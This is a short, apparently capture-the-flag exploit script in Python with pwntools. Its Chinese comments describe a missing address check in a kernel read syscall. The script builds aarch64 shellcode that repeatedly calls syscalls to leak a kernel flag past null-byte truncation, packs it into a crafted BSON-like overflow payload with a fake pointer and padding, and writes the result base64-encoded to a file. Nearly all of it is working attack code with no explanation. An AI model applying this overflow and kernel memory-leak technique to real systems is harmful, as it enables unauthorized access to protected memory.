# syscall_read 时不对目标地址进行check
# 将syscall_log 时 kprintf 的 "%s" 到 kernel_flag 的内容填满来绕过 "\x00" 截断
# 即可在输出时将 kernel 中的 flag 打印

from pwn import *
context.arch = "aarch64"
s='''
	movk x0, #0x8628
	movk x0, #0x08 ,lsl #16
	movk x0, 0xffff, lsl #48
	mov  x11, x0
	mov  x9, #23
	mov  x10, #0
loop:                 
    mov x8, 4
    mov x1, 0
    mov x0, 0xfc46
    mov x2, 0
    svc #0
    
    mov x8, 5
    mov x1, x11
    mov x2, 0x18
    svc #0

    add x11,x11,0x18
    add x10,x10,1
    CMP x9, x10
    BNE loop

    mov x8, 4
    mov x1, 0
    mov x0, 0xfc46
    mov x2, 0
    svc #0
    
    mov x8, 5
    mov x1, x11
    mov x2, 8
    svc #0

    mov x8, 0
    svc #0
'''
shellcode = asm(s)


name = b'/flg'.ljust(10, b'\x00')

payload = b'\xe0\x00\x00\x00\x10CVC\x00`\x01\x00\x00\x10MON\x00\x00\x00\x00\x00\x10YR\x00\x00\x00\x00\x00\x02CC\x00\x10\x00\x00\x006011222233334410'
payload += p64(0xFFFFFFFFFFFFFFFF) + p64(0xfc50) + name + shellcode + b'A'*(152 - len(shellcode)) 
payload += b'\x00\x00'
# b"gg/run\x00ttt"
buf = base64.b64encode(payload) + b' '
with open('gen-bson0', 'wb') as f:
    f.write(buf)
